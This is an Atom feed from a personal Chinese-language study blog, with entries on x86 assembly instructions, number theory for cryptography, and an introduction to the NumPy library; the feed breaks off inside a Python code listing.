<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://Self-ferry.github.io</id>
    <title>1asy</title>
    <subtitle>Till I no longer can</subtitle>
    <icon>https://self-ferry.github.io/images/favicon.ico</icon>
    <link href="https://Self-ferry.github.io" />
    <author>
      <name>1asy</name>
    </author>
    <updated>2021-03-24T12:19:17.000Z</updated>
    <category term="学习" />
    <entry>
        <id>https://self-ferry.github.io/2021/03/24/%E6%B1%87%E7%BC%96%E5%A4%8D%E4%B9%A0/</id>
        <title>汇编复习</title>
        <link rel="alternate" href="https://self-ferry.github.io/2021/03/24/%E6%B1%87%E7%BC%96%E5%A4%8D%E4%B9%A0/"/>
        <content type="html">&lt;h1 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h1&gt;
&lt;p&gt;之前学的，因为一些事情就耽搁了，转而学其他的了，现在有时间了，打算接着学，发现忘的差不多了。只能重学了。&lt;br /&gt;
逆水行舟，不进则退。&lt;/p&gt;
&lt;h1 id=&#34;内存格式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#内存格式&#34;&gt;#&lt;/a&gt; 内存格式&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;每个内存单元宽度为 8&lt;/li&gt;
&lt;li&gt;【0x 编号】称为内存地址&lt;/li&gt;
&lt;li&gt;内存是存储数据的，内存地址是对存储数据的一个标识，指向数据却不是数据，通过内存地址的指引，可以访问到内存当中指向的数据.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;内存最小的单位是一个字节 ==&amp;gt;&amp;gt; 8 个二进制数  ==&amp;gt;&amp;gt; 两位的十六进制数&lt;/p&gt;
&lt;p&gt;一个内存单元能存一个两位的十六进制数，而这就是内存数据&lt;/p&gt;
&lt;h1 id=&#34;简单指令intel汇编语法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简单指令intel汇编语法&#34;&gt;#&lt;/a&gt; 简单指令 (intel 汇编语法)&lt;/h1&gt;
&lt;h2 id=&#34;mov&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mov&#34;&gt;#&lt;/a&gt; mov&lt;/h2&gt;
&lt;p&gt;格式：  &lt;code&gt;mov destination, source&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;mov eax, ebx&lt;/code&gt;   // 将 EBX 中的内容复制到 EAX 寄存器中&lt;br /&gt;
 &lt;code&gt;mov eax, 0x42&lt;/code&gt;  // 将立即数 0x42 复制到 EAX 寄存器中&lt;br /&gt;
 &lt;code&gt;mov eax, [0x443212C4]&lt;/code&gt;  // 将内存地址 0x443212C4 的四个字节复制到 EAX 寄存器&lt;br /&gt;
 &lt;code&gt;mov eax, [ebx+esi*4]&lt;/code&gt;   // 将 ebx+esi*4 等式结果只想的内存地址处 4 个字节复制至 EAX&lt;/p&gt;
&lt;h2 id=&#34;lea&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#lea&#34;&gt;#&lt;/a&gt; lea&lt;/h2&gt;
&lt;p&gt;格式：  &lt;code&gt;lea destination, source&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;lea 指令用来将一个内存地址赋给目的操作数。&lt;br /&gt;
例如，  &lt;code&gt;lea eax, [ebx+8]&lt;/code&gt;  就是将 EBX+8 的值给 EAX。&lt;br /&gt;
相反的， &lt;code&gt;mov eax, [ebx+8]&lt;/code&gt;  则加载内存中地址为 EBX+8 处的数据。&lt;/p&gt;
&lt;h2 id=&#34;算术运算&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#算术运算&#34;&gt;#&lt;/a&gt; 算术运算&lt;/h2&gt;
&lt;h3 id=&#34;加减运算&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#加减运算&#34;&gt;#&lt;/a&gt; 加减运算&lt;/h3&gt;
&lt;p&gt;&lt;span class=&#34;label&#34;&gt;例子&lt;/span&gt;&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;指令&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;描述&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;sub eax,0x10&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;EAX 寄存器值减去 0x10&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;add eax,ebx&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;将 EBX 值加入 EAX 并将结果保存至 EAX&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;inc edx&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;EDX 值递增 1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;dec ecx&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;ECX 值递减 1&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;乘除运算&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#乘除运算&#34;&gt;#&lt;/a&gt; 乘除运算&lt;/h3&gt;
&lt;p&gt;乘法和除法都使用了一个预先规定的寄存器。因此其运算就是指令码加上寄存器要去乘除的值。&lt;br /&gt;
 &lt;code&gt;mul&lt;/code&gt;  和 &lt;code&gt;div&lt;/code&gt;  指令要操作的寄存器一般会在之前许多条指令的地方被赋值，因此你可能需要在程序的上下文中来寻找。&lt;br /&gt;
 &lt;code&gt;mul value&lt;/code&gt;  指令总是将 &lt;code&gt;eax&lt;/code&gt;  乘上 &lt;code&gt;value&lt;/code&gt; 。因此， &lt;code&gt;EAX&lt;/code&gt;  寄存器必须在乘法指令出现前就赋值好。&lt;/p&gt;
&lt;p&gt;乘法的结果以 64 位的形式分开存储在两个寄存器中： &lt;code&gt;EDX&lt;/code&gt;  和 &lt;code&gt;EAX&lt;/code&gt; 。其中 EDX 存储了高的 32 位，EAX 存储低的 32 位。&lt;/p&gt;
&lt;p&gt;32 位模式下，MUL（无符号数乘法）指令有三种类型：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;第一种执行 8 位操作数与 AL 寄存器的乘法；
第二种执行 16 位操作数与 AX 寄存器的乘法；
第三种执行 32 位操作数与 EAX 寄存器的乘法。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;乘数和被乘数的大小必须保持一致，乘积的大小则是它们的一倍。这三种类型都可以使用寄存器和内存操作数，但不能使用立即数：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;MUL reg/mem8
MUL reg/meml6
MUL reg/mem32
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;MUL 指令中的单操作数是乘数。下表按照乘数的大小，列出了默认的被乘数和乘积。由于目的操作数是被乘数和乘数大小的两倍，因此不会发生溢岀。&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;被乘数&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;乘数&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;乘积&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;AL&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;reg/mem8&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;AX&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;AX&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;reg/mem16&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;DX:AX&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;EAX&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;reg/mem32&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;EDX:EAX&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;如果乘积的高半部分不为零，则 MUL 会把进位标志位和溢出标志位置 1。因为进位标志位常常用于无符号数的算术运算，在此我们也主要说明这种情况。例如，当 AX 乘以一个 16 位操作数时，乘积存放在 DX 和 AX 寄存器对中。其中，乘积的高 16 位存放在 DX，低 16 位存放在 AX。如果 DX 不等于零，则进位标志位置 1，这就意味着隐含的目的操作数的低半部分容纳不了整个乘积。&lt;/p&gt;
&lt;p&gt;有个很好的理由要求在执行 MUL 后检查进位标志位，即，确认忽略乘积的高半部分是否安全。&lt;/p&gt;
&lt;p&gt;32 位模式下，DIV（无符号除法）指令执行 8 位、16 位和 32 位无符号数除法。其中，单寄存器或内存操作数是除数。格式如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;DIV reg/mem8
DIV reg/meml6
DIV reg/mem32
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;下表给出了被除数、除数、商和余数之间的关系：&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;被除数&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;除数&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;商&lt;/td&gt;
&lt;td&gt;余数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;AX&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;reg/mem8&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;AL&lt;/td&gt;
&lt;td&gt;AH&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;DX:AX&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;reg/mem16&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;AX&lt;/td&gt;
&lt;td&gt;DX&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;EDX:EAX&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;reg/mem32&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;EAX&lt;/td&gt;
&lt;td&gt;EDX&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;64 位模式下，DIV 指令用 RDX:RAX 作被除数，用 64 位寄存器和内存操作数作除数，商存放到 RAX，余数存放在 RDX 中。&lt;/p&gt;
&lt;h2 id=&#34;逻辑运算符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#逻辑运算符&#34;&gt;#&lt;/a&gt; 逻辑运算符&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;否操作指令 NOT&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;NOT OPRD&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;把 OPRD 取反，再回送给 OPRD&lt;/p&gt;
&lt;p&gt;对标志位没有影响&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;与操作指令 AND [与]&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;AND OPRD1，OPRD2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;OPRD1 和 OPRD2 执行与操作，结果送到 OPRD1&lt;/p&gt;
&lt;p&gt;执行后，CF＝OF＝0，标志 PF，ZF，SF 反映运算结果，AF 未定义&lt;/p&gt;
&lt;p&gt;某个操作数自身与，值不变，可使进位标志 CF＝0&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;或操作指令 OR [或]&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;OR OPRD1 OPRD2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;标志位同与运算指令&lt;/p&gt;
&lt;p&gt;某个操作数自身或，值不变，可使进位标志 CF＝0&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;异或操作指令 XOR [异或]&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;XOR OPRD1 OPRD2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;标志位同与运算指令&lt;/p&gt;
&lt;p&gt;某个操作数自身异或，值不变，可使进位标志 CF＝0&lt;/p&gt;
&lt;p&gt;与 0 异或，不变，与 1 异或，取反。&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;测试指令 TEST&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;TEST OPRD1 OPRD2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;指令与 AND 类似，但结果不回送&lt;/p&gt;
&lt;p&gt;指令执行后，ZF，PF，SF 反映运算结果，CF＝OF＝0&lt;/p&gt;
</content>
        <category term="汇编" scheme="https://self-ferry.github.io/categories/%E6%B1%87%E7%BC%96/" />
        <category term="x86汇编指令" scheme="https://self-ferry.github.io/tags/x86%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/" />
        <updated>2021-03-24T12:19:17.000Z</updated>
    </entry>
    <entry>
        <id>https://self-ferry.github.io/2021/03/24/%E5%AF%86%E7%A0%81%E5%AD%A6%E6%95%B0%E8%AE%BA%E5%9F%BA%E7%A1%80/</id>
        <title>密码学数论基础</title>
        <link rel="alternate" href="https://self-ferry.github.io/2021/03/24/%E5%AF%86%E7%A0%81%E5%AD%A6%E6%95%B0%E8%AE%BA%E5%9F%BA%E7%A1%80/"/>
        <content type="html">&lt;h1 id=&#34;数论基础&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数论基础&#34;&gt;#&lt;/a&gt; 数论基础&lt;/h1&gt;
&lt;h2 id=&#34;整除性和带余除法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#整除性和带余除法&#34;&gt;#&lt;/a&gt; 整除性和带余除法&lt;/h2&gt;
&lt;h2 id=&#34;整除性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#整除性&#34;&gt;#&lt;/a&gt; 整除性&lt;/h2&gt;
&lt;p&gt;&lt;span class=&#34;label&#34;&gt;定义：&lt;/span&gt;&lt;br /&gt;
a、b 是两个整数，b≠0 ，如果存在一个整数 m 使等式 a=m*b 成立，则称 b 整除 a，记为 b|a,a 是被除数，b 是除数。&lt;/p&gt;
&lt;p&gt;a/b 记为 b|a a 除以 b 记为 b 整除 a&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label&#34;&gt;性质：&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;若 a|1， 则 a=±1。&lt;/li&gt;
&lt;li&gt;若 a|b 且 b|a，则 a=±b。&lt;/li&gt;
&lt;li&gt;任何不等于零的数整除 0。&lt;/li&gt;
&lt;li&gt;若 a|b 且 b|c，则 a|c。&lt;br /&gt;
 &lt;code&gt;11|66 且 66|198 =&amp;gt; 11|198&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;对任意整数 m，n，若 b|g 且 b|h，则可得出 b|（mg+nh）。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;之所以得出最后一条结论，是因为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;若 b|g，存在 g1，使得 g 可以表示为 g=b*g1&lt;/li&gt;
&lt;li&gt;若 b|h, 则存在 h1，使得还可以表示为 h=b*h1&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所以：&lt;br /&gt;
 &lt;code&gt;mg + nh = mbg1 + nbh1 = b * (mg1 + nh1)&lt;/code&gt; &lt;br /&gt;
 得出 b 整除 mg+nh。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label&#34;&gt;例题&lt;/span&gt;&lt;br /&gt;
&lt;img data-src=&#34;image001.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;带余除法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#带余除法&#34;&gt;#&lt;/a&gt; 带余除法&lt;/h3&gt;
&lt;p&gt;对给定的任意一个正整数 n 和任意非负整数 a, 若用 n 除 a, 得到整数商 q 和整数余数 r, 则满足以下关系式:&lt;br /&gt;
 &lt;code&gt;a = qn + r, 0 ≤ r &amp;lt; n; q = |(a|b)|&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;欧几里得算法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#欧几里得算法&#34;&gt;#&lt;/a&gt; 欧几里得算法&lt;/h2&gt;
&lt;h3 id=&#34;最大公约数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#最大公约数&#34;&gt;#&lt;/a&gt; 最大公约数&lt;/h3&gt;
&lt;p&gt;最大公约数，也称最大公因数、最大公因子，指两个或多个整数共有约数中最大的一个。&lt;/p&gt;
&lt;p&gt;对于整数 a,b,m, 若满足 a=mb, 则称非零整数 b 是 a 的一个因子。我们用 gcd (a,b) 来表示 a 的最大公因子。a 和 b 的最大公因子是能同时整除 a 和 b 的最大整数。另外，定义 gcd (0,0)=0。&lt;br /&gt;
更正式的描述是，正整数 c 称为 a 和 b 的最大公因子，如果&lt;br /&gt;
 (1) c 是 a 和 b 的因子。&lt;br /&gt;
(2) a、b 的因子都是 c 的一个因子。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image002.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
</content>
        <category term="密码编码学与网络安全" scheme="https://self-ferry.github.io/categories/%E5%AF%86%E7%A0%81%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" />
        <category term="数论基础" scheme="https://self-ferry.github.io/tags/%E6%95%B0%E8%AE%BA%E5%9F%BA%E7%A1%80/" />
        <updated>2021-03-24T06:19:48.000Z</updated>
    </entry>
    <entry>
        <id>https://self-ferry.github.io/2021/03/23/%E6%95%B0%E7%BB%84%E4%B8%8E%E7%9F%A9%E9%98%B5/</id>
        <title>数组与矩阵</title>
        <link rel="alternate" href="https://self-ferry.github.io/2021/03/23/%E6%95%B0%E7%BB%84%E4%B8%8E%E7%9F%A9%E9%98%B5/"/>
        <content type="html">&lt;p&gt;&lt;span class=&#34;label success&#34;&gt;✔️来首音乐吧&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;media-container&#34;&gt;&lt;div class=&#34;player&#34; data-type=&#34;audio&#34; data-src=&#39;[{&#34;title&#34;:&#34;列表 1&#34;,&#34;list&#34;:[&#34;https://music.163.com/#/song?id=&#34;]}]&#39;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h1 id=&#34;&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#&#34;&gt;#&lt;/a&gt; &lt;/h1&gt;
</content>
        <updated>2021-03-23T11:09:25.000Z</updated>
    </entry>
    <entry>
        <id>https://self-ferry.github.io/2021/03/23/pandas%E5%BA%93%E5%AD%A6%E4%B9%A0/</id>
        <title>pandas库学习</title>
        <link rel="alternate" href="https://self-ferry.github.io/2021/03/23/pandas%E5%BA%93%E5%AD%A6%E4%B9%A0/"/>
        <content type="html">&lt;p&gt;&lt;span class=&#34;label success&#34;&gt;✔️来首音乐吧&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;media-container&#34;&gt;&lt;div class=&#34;player&#34; data-type=&#34;audio&#34; data-src=&#39;[{&#34;title&#34;:&#34;列表 1&#34;,&#34;list&#34;:[&#34;https://music.163.com/#/song?id=&#34;]}]&#39;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h1 id=&#34;&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#&#34;&gt;#&lt;/a&gt; &lt;/h1&gt;
</content>
        <updated>2021-03-23T11:08:13.000Z</updated>
    </entry>
    <entry>
        <id>https://self-ferry.github.io/2021/03/23/numpy%E5%BA%93%E5%AD%A6%E4%B9%A0/</id>
        <title>numpy库学习</title>
        <link rel="alternate" href="https://self-ferry.github.io/2021/03/23/numpy%E5%BA%93%E5%AD%A6%E4%B9%A0/"/>
        <content type="html">&lt;h1 id=&#34;reference&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#reference&#34;&gt;#&lt;/a&gt; Reference&lt;/h1&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucnVub29iLmNvbS9udW1weS9udW1weS10dXRvcmlhbC5odG1s&#34;&gt;https://www.runoob.com/numpy/numpy-tutorial.html&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;numpy库简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#numpy库简介&#34;&gt;#&lt;/a&gt; Numpy 库简介&lt;/h1&gt;
&lt;p&gt;NumPy (Numerical Python) 是 Python 语言的一个扩展程序库，支持大量的维度数组与矩阵运算，此外也针对数组运算提供大量的数学函数库。&lt;/p&gt;
&lt;p&gt;NumPy 的前身 Numeric 最早是由 Jim Hugunin 与其它协作者共同开发，2005 年，Travis Oliphant 在 Numeric 中结合了另一个同性质的程序库 Numarray 的特色，并加入了其它扩展而开发了 NumPy。NumPy 为开放源代码并且由许多协作者共同维护开发。&lt;/p&gt;
&lt;p&gt;NumPy 是一个运行速度非常快的数学库，主要用于数组计算，包含：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一个强大的 N 维数组对象 ndarray&lt;/li&gt;
&lt;li&gt;广播功能函数&lt;/li&gt;
&lt;li&gt;整合 C/C++/Fortran 代码的工具&lt;/li&gt;
&lt;li&gt;线性代数、傅里叶变换、随机数生成等功能&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;numpy-应用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#numpy-应用&#34;&gt;#&lt;/a&gt; NumPy 应用&lt;/h1&gt;
&lt;p&gt;NumPy 通常与 SciPy（Scientific Python）和 Matplotlib（绘图库）一起使用， 这种组合广泛用于替代 MatLab，是一个强大的科学计算环境，有助于我们通过 Python 学习数据科学或者机器学习。&lt;/p&gt;
&lt;p&gt;SciPy 是一个开源的 Python 算法库和数学工具包。&lt;/p&gt;
&lt;p&gt;SciPy 包含的模块有最优化、线性代数、积分、插值、特殊函数、快速傅里叶变换、信号处理和图像处理、常微分方程求解和其他科学与工程中常用的计算。&lt;/p&gt;
&lt;p&gt;Matplotlib 是 Python 编程语言及其数值数学扩展包 NumPy 的可视化操作界面。它为利用通用的图形用户界面工具包，如 Tkinter, wxPython, Qt 或 GTK+ 向应用程序嵌入式绘图提供了应用程序接口（API）。&lt;/p&gt;
&lt;h1 id=&#34;相关链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关链接&#34;&gt;#&lt;/a&gt; 相关链接&lt;/h1&gt;
&lt;p&gt;NumPy 官网 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5udW1weS5vcmcv&#34;&gt;http://www.numpy.org/&lt;/span&gt;&lt;br /&gt;
NumPy 源代码：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL251bXB5L251bXB5&#34;&gt;https://github.com/numpy/numpy&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;numpy-ndarray对象&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#numpy-ndarray对象&#34;&gt;#&lt;/a&gt; Numpy Ndarray 对象&lt;/h1&gt;
&lt;p&gt;NumPy 最重要的一个特点是其 N 维数组对象 ndarray，它是一系列同类型数据的集合，以 0 下标为开始进行集合中元素的索引。&lt;/p&gt;
&lt;p&gt;ndarray 对象是用于存放同类型元素的多维数组。&lt;/p&gt;
&lt;p&gt;ndarray 中的每个元素在内存中都有相同存储大小的区域。&lt;/p&gt;
&lt;p&gt;ndarray 内部由以下内容组成：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;一个指向数据（内存或内存映射文件中的一块数据）的指针。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数据类型或 dtype，描述在数组中的固定大小值的格子。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一个表示数组形状（shape）的元组，表示各维度大小的元组。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一个跨度元组（stride），其中的整数指的是为了前进到当前维度下一个元素需要 &amp;quot;跨过&amp;quot; 的字节数。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;创建ndarray&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#创建ndarray&#34;&gt;#&lt;/a&gt; 创建 Ndarray&lt;/h1&gt;
&lt;p&gt;创建一个 ndarray 只需调用 NumPy 的 array 函数即可：&lt;br /&gt;
 &lt;code&gt;numpy.array(object, dtype = None, copy = True, order = None, subok = False, ndmin = 0)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;参数说明：&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;名称&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;描述&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;object&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;数组或嵌套的数列&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;dtype&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;数组元素的数据类型，可选&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;copy&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;对象是否需要复制，可选&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;order&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;创建数组的样式，C 为行方向，F 为列方向，A 为任意方向（默认）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;subok&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;默认返回一个与基类类型一致的数组&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;ndmin&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;指定生成数组的最小维度&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;认识numpy的数组对象ndarray&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#认识numpy的数组对象ndarray&#34;&gt;#&lt;/a&gt; 认识 Numpy 的数组对象 Ndarray&lt;/h1&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; numpy &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; np  &lt;span class=&#34;token comment&#34;&gt;# 导入 NumPy 库&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;arr1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;array&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 创建一维数组&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td 